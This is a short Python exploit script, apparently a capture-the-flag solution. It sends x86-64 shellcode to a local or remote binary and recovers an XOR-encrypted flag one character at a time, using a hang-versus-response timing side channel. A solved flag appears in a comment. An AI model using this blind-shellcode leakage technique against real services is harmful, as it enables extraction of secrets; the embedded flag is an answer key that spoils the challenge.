#!/usr/bin/python3
# -*- encoding: utf-8 -*-
from pwncli import *

cli_script()

debug = gift.debug
filename = gift.filename

if not debug:
    ip = gift.ip
    port = gift.port

# flag{2bb747aa-dabb-4826-a4d7-9fcb98b949f8}

shellcode = """
    /* alarm(0) */
    mov al, 0x25
    syscall
    /* recover key */
    mov ebp, 0xcafe000
    mov eax, dword ptr [rbp]
    xor eax, 0x67616c66
    mov ebx, dword ptr [rbp+0x28+4]
    shl rbx, 32
    or rbx, rax

    /* recover flag */
L1:
    xor qword ptr [rbp + 8 * rdx], rbx
    inc edx
    cmp dl, 6
    jnz L1
L2:
    cmp byte ptr [rbp + {}], {}
    jz L2 /* stuck */
"""

idx = 0
flag = ""

for _ in range(42):
    err = True
    for i in bytearray(b"-{{}}flagbcde0123456789"):
        if debug:
            io = process(filename)
        else:
            io = remote(ip, port)
        io.send(asm(shellcode.format(idx, hex(i))))
        if io.can_recv_raw(3):
            io.close()
            continue
        else:
            flag += chr(i)
            print(f"Now flag is : {flag}")
            io.close()
            err = False
            break
    if err:
        error("This round is wrong!")
    
    idx += 1
